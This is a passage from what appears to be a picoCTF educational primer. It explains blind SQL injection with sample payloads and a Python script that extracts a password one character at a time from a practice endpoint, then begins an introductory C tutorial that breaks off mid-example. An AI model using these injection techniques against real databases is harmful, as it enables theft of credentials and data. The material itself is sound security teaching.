                            trials, which is 626 trials, because they can have different combinations. If we add more
                            characters, guessing the whole word becomes much harder because it would emerge too many
                            possible words. Nonetheless, guessing one letter at a time, will keep being only 26 trials
                            for each letter. The blind SQL injection is based on that fact, it will try to inject a
                            query that only compares one character at a time.</p>
                    </div>
                    <div class="paragraph">
                        <p>To be able to do that, you need to know the name of the column you are trying to guess. This
                            is not that hard, because in many cases you can infer the name of the database column based
                            on the name of the html input. In other cases, you can leak the name if an error occurs
                            inside the application, and in the error message the application shows the value of the
                            columns.</p>
                    </div>
                    <div class="paragraph">
                        <p>For the page we are attacking in this example the names are the same as the html input. One
                            column is called 'username', and the other one is called 'password'.</p>
                    </div>
                    <div class="paragraph">
                        <p>So far, you know that if you inject:</p>
                    </div>
                    <div class="paragraph">
                        <p><strong>' or '1'='1</strong></p>
                    </div>
                    <div class="paragraph">
                        <p>It will return results, but you are not learning any information. We know two column names,
                            'username' and password. For this example, suppose you know a user called 'picoctf' and you
                            want to get the password from that user. To narrow down the query to the row in which the
                            user 'picoctf' information is stored, you could use:</p>
                    </div>
                    <div class="paragraph">
                        <p><strong>' or username='picoctf</strong></p>
                    </div>
                    <div class="paragraph">
                        <p>Note that we do not use the <strong>'1'='1</strong> anymore because we want a statement that
                            will filter only one user. If you inject this on the password field from the web page, you
                            will still see:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image14.png" alt="image" width="624" height="130">
                        </div>
                        <div class="title">Figure 52. Register found after injection</div>
                    </div>
                    <div class="paragraph">
                        <p>Remember that in our injection, if the part at the right of the "or" is true, it will return
                            results. It is true that username is equal to 'picoctf' only in the row on the picoctf!</p>
                    </div>
                    <div class="paragraph">
                        <p>Now we will add the part that compares the first character of the password. We can do that
                            using an embedded query. An embedded query is a query inside a query. Our embedded query
                            highlighted in green, will simply return the first character of the password. We will
                            compare that first character with the character 'a', so we are guessing that the first
                            character is 'a':</p>
                    </div>
                    <div class="paragraph">
                        <p><strong>' or username='picoctf' and <span class="lime">(select substr(password, 1,
                                    1))</span>='a</strong></p>
                    </div>
                    <div class="paragraph">
                        <p>If you inject this, you will see that nothing is found:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image8.png" alt="image" width="624" height="206">
                        </div>
                        <div class="title">Figure 53. Nothing found after comparing with single character</div>
                    </div>
                    <div class="paragraph">
                        <p>This is because we did not guess the first character. If you keep trying different
                            characters, you will find that the first character of the password is 'f', when you inject
                            this:</p>
                    </div>
                    <div class="paragraph">
                        <p><strong>' or username='picoctf' and <span class="lime">(select substr(password, 1,
                                    1))</span>='f</strong></p>
                    </div>
                    <div class="paragraph">
                        <p>And see as a result this:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/3image5.png" alt="image" width="624" height="185">
                        </div>
                        <div class="title">Figure 54. Register found after comparing with single character</div>
                    </div>
                    <div class="paragraph">
                        <p>You could possibly find the whole password manually, but it would take too much effort. On
                            the other hand, you may want to obtain all the passwords in the database, or even all the
                            fields from the database! This same process can be applied for any field In most of the SQL
                            engines there is a system table that contains the names of all tables and columns, so once
                            we find a SQL injections databases we might be able to leak the whole database. For this
                            exercise we will only obtain one password. To be more efficient, we will write a python
                            script that does the job for us. Suppose we found the name of the table in some way. The
                            script is the following:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-kn">import</span> <span class="tok-nn">requests</span>
<span class="tok-kn">from</span> <span class="tok-nn">string</span> <span class="tok-kn">import</span> <span class="tok-n">printable</span>

<span class="tok-n">accum</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;&quot;</span>
<span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-mi">40</span><span class="tok-p">):</span>
  <span class="tok-k">for</span> <span class="tok-n">letter</span> <span class="tok-ow">in</span> <span class="tok-n">printable</span><span class="tok-p">:</span>
    <span class="tok-n">accum</span> <span class="tok-o">+=</span> <span class="tok-n">letter</span>

    <span class="tok-n">r</span> <span class="tok-o">=</span> <span class="tok-n">requests</span><span class="tok-o">.</span><span class="tok-n">post</span><span class="tok-p">(</span><span class="tok-s2">&quot;https://primer.picoctf.org/vuln/web/blindsql.php?&amp;username=WeDontCare&amp;password=&#39; or &#39;&quot;</span>
    <span class="tok-o">+</span> <span class="tok-n">letter</span> <span class="tok-o">+</span><span class="tok-s2">&quot;&#39;=( select substr(binary password,&quot;</span><span class="tok-o">+</span><span class="tok-nb">str</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span><span class="tok-o">+</span><span class="tok-s2">&quot;,1) from pico_blind_injection where id=1 ) and &#39;&#39;= &#39;&quot;</span><span class="tok-p">)</span>

    <span class="tok-k">if</span> <span class="tok-s1">&#39;NOTHING FOUND...&#39;</span> <span class="tok-ow">in</span> <span class="tok-n">r</span><span class="tok-o">.</span><span class="tok-n">text</span><span class="tok-p">:</span>
      <span class="tok-n">accum</span> <span class="tok-o">=</span> <span class="tok-n">accum</span><span class="tok-p">[:</span><span class="tok-o">-</span><span class="tok-mi">1</span><span class="tok-p">]</span>
      <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;nope&quot;</span><span class="tok-p">)</span>
    <span class="tok-k">else</span><span class="tok-p">:</span>
      <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-sa">f</span><span class="tok-s2">&quot;We found the character: </span><span class="tok-si">{</span><span class="tok-n">letter</span><span class="tok-si">}</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">accum</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This script is just one of the many ways in which a blind SQL injection is done. With your
                            knowledge of Python and SQL, you should be able to understand the script if you read it
                            carefully. Note the following:</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>'Printable' is just a string with all the printable ASCII characters, and we iterate
                                    over them.</p>
                            </li>
                            <li>
                                <p>'Binary' in mysql context, is just a way to specify the we want to make case
                                    sensitive comparisons. If we do not use it, we would not be able to identify if a
                                    character is lowercase or uppercase.</p>
                            </li>
                            <li>
                                <p>We are sending GET parameters to the web site. For this reason, we can encode them in
                                    the URL.</p>
                            </li>
                            <li>
                                <p>We put the <strong>select '</strong> at the end of the query to handle the closing
                                    single quote.</p>
                            </li>
                            <li>
                                <p>'NOTHING FOUND&#8230;&#8203;' Is the message printed in the html, so if that is
                                    present in the html then a wrong letter was guessed.</p>
                            </li>
                            <li>
                                <p>To clear your doubts, experiment in the SQL editor with similar queries, or do prints
                                    on the python script to make sure you understand every part of it.</p>
                            </li>
                        </ul>
                    </div>
                    <div class="paragraph">
                        <p>Depending on the SQL engine, there can be several ways to inject SQL. Even Frameworks that
                            handle the queries for you, might have vulnerabilities in some versions, or because they are
                            used incorrectly by developers.</p>
                    </div>
                    <div class="paragraph">
                        <p>Keep up the good work!</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_a_little_about_c_language">9. A little about C language</h2>
            <div class="sectionbody">
                <h5 id="_samuel_sabogal_pardo_6" class="discrete">Samuel Sabogal Pardo</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>We could say that C is one of the oldest programming languages that is still widely used in
                        industry. It was developed in 1972 by the famous Dennis Ritchie, and even after all these years,
                        is in fact one of the most used languages. This is the case because it is very efficient and we
                        can control very directly the resources of the machine, in contrast to other languages, such as
                        python. However, it is a more difficult language to learn to use it correctly, and it is much
                        more prone to errors and vulnerabilities. Even experienced programmers that have written a lot
                        of C in their lives can make a little mistake and introduce a bad vulnerability in a program
                        that a hacker can exploit to take complete control of the machine in which the program is
                        running.</p>
                </div>
                <div class="paragraph">
                    <p>Nonetheless, many people still love C. We can use it to implement programs that need to be very
                        efficient, such as the Operating Systems, Drivers (the programs that control the hardware of
                        devices that we connect to our computer), or Embedded Systems. You will probably not hear about
                        an Operating System, or a Driver, fully implemented on python, at least any time soon.</p>
                </div>
                <div class="sect2">
                    <h3 id="_some_c_features">9.1. Some C features</h3>
                    <div class="paragraph">
                        <p>Keep in mind the following aspects of C:</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>In C you can access directly an address of memory, and move through it with a pointer
                                    even if you don&#8217;t have a variable that is stored there.</p>
                            </li>
                            <li>
                                <p>C is very prompt to vulnerabilities, as we already mentioned. We will learn to
                                    exploit those vulnerabilities. C is harder to learn and write than python, because
                                    you need to clearly understand how the memory interacts with your program.</p>
                            </li>
                            <li>
                                <p>It is not indented as python to determine the lines of code inside a function, loop,
                                    clause, etc. For example, the lines of code inside an 'if clause', are determined by
                                    braces, not four spaces. This is an 'if clause' in python and C respectively:</p>
                            </li>
                        </ul>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">if</span> <span class="tok-n">x</span><span class="tok-o">&gt;</span><span class="tok-mi">5</span><span class="tok-p">:</span>
    <span class="tok-nb">print</span> <span class="tok-s2">&quot;Hello&quot;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, the same in C, would look like (the 'f' at the end of print is necessary):</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-k">if</span><span class="tok-p">(</span><span class="tok-n">x</span><span class="tok-o">&gt;</span><span class="tok-mi">5</span><span class="tok-p">)</span>
<span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;Hello&quot;</span><span class="tok-p">);</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>But in C, we could do:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-k">if</span><span class="tok-p">(</span><span class="tok-n">x</span><span class="tok-o">&gt;</span><span class="tok-mi">5</span><span class="tok-p">)</span>
<span class="tok-p">{</span>
<span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;Hello&quot;</span><span class="tok-p">);</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And it would work. But it is important you do not write it like that if you begin to do
                            programming in C, because a program can become very unreadable. Always use indentations on
                            C, even if they are not mandatory.</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>In C, you do comments using '//', instead of '#' as in python. For example, the same
                                    comment in python and C, would be:</p>
                            </li>
                        </ul>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span> <span class="tok-c1">#This is a comment in python</span></code></pre>
                        </div>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-w"> </span><span class="tok-c1">//This is a comment in C</span></code></pre>
                        </div>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>You can compile C for different platforms. Compiling means the process of translating
                                    the programing language to machine code. A computer does not understand directly the
                                    source code you write. A compiler is a program that reads your source code and
                                    converts it to a binary that your computer can execute. The instructions in that
                                    binary are harder to read for a human in comparison to the source code. Those
                                    instructions that the processor understands directly are called machine code. When
                                    the programs is compiled, you do not need any additional program to execute it
                                    besides the operating system. In contrast, when you run a python program, to execute
                                    it, you need the python interpreter.</p>
                            </li>
                            <li>
                                <p>Since C is so direct to the machine, people often say that it is like a portable
                                    Assembly. Assembly, as we will see later, is a language that is used to manipulate
                                    the instructions of the processor in your machine. Assembly changes depending on the
                                    kind of processor you are using. For example, Intel processors understand a
                                    different Assembly language than ARM processors. However, you could write the same
                                    program in C and it could work on both, because you can compile it either for ARM or
                                    for Intel.</p>
                            </li>
                            <li>
                                <p>In languages like python, we do not compile the program, because python has an
                                    interpreter that translates line by line when it is being executed. That makes it
                                    slower, by a fair amount. You can do an experiment by implementing a for loop that
                                    calculates something on each iteration, and compare the result between python and C,
                                    and you will note that a python loop takes much longer than a C loop that calculate
                                    the same.</p>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_c_hello_world">9.2. C Hello World!</h3>
                    <div class="paragraph">
                        <p>Let&#8217;s get hands on now! Access the picoCTF webshell at:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="https://webshell.picoctf.org/" class="bare">https://webshell.picoctf.org/</a></p>
                    </div>
                    <div class="paragraph">
                        <p>Create a folder called 'c_examples' using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>mkdir c_examples</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Go inside the folder using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>cd c_examples</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, create a file called "my_c_example.c" in this file, we will write the C code. You can
                            create the file with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>nano my_c_example.c</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Into that file, write the following code, which will print "Hello World!"</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>

<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">()</span><span class="tok-w"> </span><span class="tok-p">{</span>
<span class="tok-w">   </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;Hello World!</span><span class="tok-se">\n</span><span class="tok-s">&quot;</span><span class="tok-p">);</span>
<span class="tok-w">   </span><span class="tok-k">return</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-p">;</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that this line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is used to import a library, which is a set of functions, that allows us to read and write
                            from the terminal in our program. This:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;Hello World!&quot;</span><span class="tok-p">);</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is the function printf, which we can use to print strings in the terminal. The function main:
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">()</span><span class="tok-w"> </span><span class="tok-p">{</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is the function that wraps the code of our program. Note that in C, the content of function
                            is enclosed in braces {}. By convention, main is the function that would be executed in our
                            program, even if we don&#8217;t call it. In C, functions return a data type. In this case,
                            main returns an 'int', which means integer. That is why we see the word 'int' right before
                            'main'. This line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-k">return</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-p">;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is our main function returning the integer 0. When the main function returns, that marks the
                            end of our program.</p>
                    </div>
                    <div class="paragraph">
                        <p>Now save the program. Remember that in the nano editor, you save the program by pressing in
                            your keyboard 'control' and 'x' at the same time. Now, to compile our program, we will use
                            'gcc' which is a very famous compiler; 'gcc' means 'GNU Compiler Collection'. To compile the
                            program, run:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>gcc my_c_example.c</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You will see no output on the screen if it compiled correctly. However, if you list the
                            contents of your current folder using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see a new file created, called 'a.out'. The is your new executable binary! You can
                            run it using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span> ./a.out</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see printed the message 'Hello World!' on the screen. Note that we can execute the
                            binary with no additional program, as we had to do with python, in which we needed the
                            python interpreter, hence we wrote 'python' before the name of our program.</p>
                    </div>
                    <div class="paragraph">
                        <p>What if we want to give a name to our binary when we compile it? We can do:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>gcc my_c_example.c -o my_binary</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>If you list the contents of your folder using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span>ls</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see the file 'my_binary' listed. You can run it using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span> ./my_binary</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And it will show 'Hello World!' as it did before.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_c_data_types">9.3. C data types</h3>
                    <div class="paragraph">
                        <p>Before proceeding to do more interesting programs, let&#8217;s stop to learn the data types
                            in C. In python, you can create a variables without specifying the data type. However, in C,
                            you need to specify it. These are fundamental data types in C:</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>char: It is the data type for allocating a single character. In most of the
                                    compilers, it takes only one byte. Note that we can store any number on it, it does
                                    not have to be an actual character. Remember that a character in a computer is a
                                    number too. Since it is one byte, it can represent 256 values. As you know already,
                                    one byte is made up of 8 bits. So, 2^8 is equal to 256.</p>
                            </li>
                            <li>
                                <p>int: It is an integer type. We can place on it an integer number, but can be much
                                    bigger as the char, because an int uses four bytes. Therefore, we can place on it,
                                    roughly, four billion values (2^32).</p>
                            </li>
                            <li>
                                <p>float: This data type is used to store decimal numbers. In other words, numbers with
                                    a floating point value. They also take four bytes. But since they are decimals, is
                                    not that easy to show how many possible values stores. It is a finite number of
                                    possible values of course. But for now, just know it is used for storing numbers
                                    with decimals. Since we are on a computer, the precision is limited. A float can
                                    have at most 7 decimals!</p>
                            </li>
                            <li>
                                <p>double: It is used to store decimal numbers but with double precision, so it can have
                                    at most 15 decimals. It takes 8 bytes.</p>
                            </li>
                        </ul>
                    </div>
                    <div class="paragraph">
                        <p>In C, you could have the following code using those data types:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>
<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">()</span><span class="tok-w"> </span><span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-kt">char</span><span class="tok-w"> </span><span class="tok-n">a</span><span class="tok-o">=</span><span class="tok-sc">&#39;p&#39;</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">b</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mi">12345</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-kt">float</span><span class="tok-w"> </span><span class="tok-n">c</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mf">1.123456</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-kt">double</span><span class="tok-w"> </span><span class="tok-n">d</span><span class="tok-w"> </span><span class="tok-o">=</span><span class="tok-w"> </span><span class="tok-mf">1.012345678912345</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> my char: %c &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">a</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> my int: %i &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">b</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> my float: %f &quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">c</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> my double: %.16g </span><span class="tok-se">\n\n</span><span class="tok-s">&quot;</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">d</span><span class="tok-p">);</span>
<span class="tok-w">    </span><span class="tok-k">return</span><span class="tok-w"> </span><span class="tok-mi">0</span><span class="tok-p">;</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Create the file 'print_data_types.c':</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>nano print_data_types.c</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And put the previous code on it. Compile it with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>gcc print_data_types.c -o print_data_types</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And run it with:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span> ./print_data_types</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see the following output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span> my char: p
 my int: 12345
 my float: 1.123456
 my double: 1.012345678912345</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We just saw how to print different data types. Things to note:</p>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>%c is used to output a character. You can have it in any position of the first string
                                    you pass as argument to printf. You can also have it in several places if you pass
                                    more characters like this:</p>
                            </li>
                        </ul>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>printf(&quot;\n my char %c , my second char %c , my third char %c  &quot;,a,a,a);</code></pre>
                        </div>
                    </div>
                    <div class="ulist">
                        <ul>
                            <li>
                                <p>%i is used to print an integer.</p>
                            </li>
                            <li>
                                <p>%f to print a float.</p>
                            </li>
                            <li>
                                <p>%.16g is to print a float but we can specify the number of decimals we want, in this
                                    case 16, but we could change that number.</p>
                            </li>
                        </ul>
                    </div>
                    <div class="paragraph">
                        <p>An important thing to note, that we already mention, is that a character is just a number
                            that is interpreted as such. Do the following experiment: use %i instead of %c to print the
                            character 'p' in our program. What number do you see and why that number?</p>
                    </div>
                    <div class="paragraph">
                        <p>Answer: You should have seen 112. That happens because 112 is the ASCII of 'p', as we can see
                            in the ASCII table:</p>
                    </div>
                    <div class="paragraph">
                        <p><a href="http://www.asciitable.com/" class="bare">http://www.asciitable.com/</a></p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_c_pointers">9.4. C pointers</h3>
                    <div class="paragraph">
                        <p>When you need to store a list of integers, you could use a buffer of memory to do it, which
                            is just a chunk of empty memory that can be filled with the integers you need. For example,
                            suppose we need to store a list of 5 integers and the print the whole list. We could do
                            something like the following:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="c"><span></span><span class="tok-cp">#include</span><span class="tok-w"> </span><span class="tok-cpf">&lt;stdio.h&gt;</span>
<span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-nf">main</span><span class="tok-p">()</span>
<span class="tok-p">{</span>
<span class="tok-w">    </span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">5</span><span class="tok-p">];</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">0</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">11</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">1</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">12</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">2</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">13</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">3</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">14</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-mi">4</span><span class="tok-p">]</span><span class="tok-o">=</span><span class="tok-mi">15</span><span class="tok-p">;</span>
<span class="tok-w">    </span><span class="tok-k">for</span><span class="tok-p">(</span><span class="tok-kt">int</span><span class="tok-w"> </span><span class="tok-n">i</span><span class="tok-o">=</span><span class="tok-mi">0</span><span class="tok-p">;</span><span class="tok-n">i</span><span class="tok-o">&lt;</span><span class="tok-mi">5</span><span class="tok-p">;</span><span class="tok-n">i</span><span class="tok-o">++</span><span class="tok-p">)</span>
<span class="tok-w">    </span><span class="tok-p">{</span>
<span class="tok-w">        </span><span class="tok-n">printf</span><span class="tok-p">(</span><span class="tok-s">&quot;</span><span class="tok-se">\n</span><span class="tok-s"> Array value at position %i: %i </span><span class="tok-se">\n</span><span class="tok-s">&quot;</span><span class="tok-p">,</span><span class="tok-n">i</span><span class="tok-p">,</span><span class="tok-w"> </span><span class="tok-n">arr</span><span class="tok-p">[</span><span class="tok-n">i</span><span class="tok-p">]);</span>
<span class="tok-w">    </span><span class="tok-p">}</span>
<span class="tok-p">}</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In the line 'int arr[5];' we are declaring an array of 5 integers. So the program allocated a
                            buffer of 20 bytes, because each integer takes 4 bytes. Then we assign an arbitrary integer
                            to each of the positions, and then we print them on a loop.</p>
                    </div>
                    <div class="paragraph">
                        <p>In C, the first line of a for loop is made up of three parts: In the first one, you can
                            declare a variable and set its starting value. That is 'int i=0' in our code. The second
                            part is the condition; the loop will keep iterating as long as that condition is met. In our
                            code the condition is 'i&lt;5'. The third part is generally a modification you do so the
                            loop advances. In this case we increment i by 1. Note that in C this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-n">i</span><span class="tok-o">++</span><span class="tok-p">;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is exactly the same as this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="c"><span></span><span class="tok-n">i</span><span class="tok-o">=</span><span class="tok-n">i</span><span class="tok-o">+</span><span class="tok-mi">1</span><span class="tok-p">;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Inside our loop, we print our counter 'i', and the current value at position in 'i' in the
                            array. Put that code in a file using:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>nano print_array.c</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Compile it:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span>gcc print_array.c -o print_array</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Run it:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="txt"><span></span> ./print_array</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see as the output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="txt"><span></span> Array value at position 0: 11
 Array value at position 1: 12
 Array value at position 2: 13
 Array value at position 3: 14
 Array value at position 4: 15</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>So far, everything seems to work fine. But now, add the following line after the for loop:
                        </p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
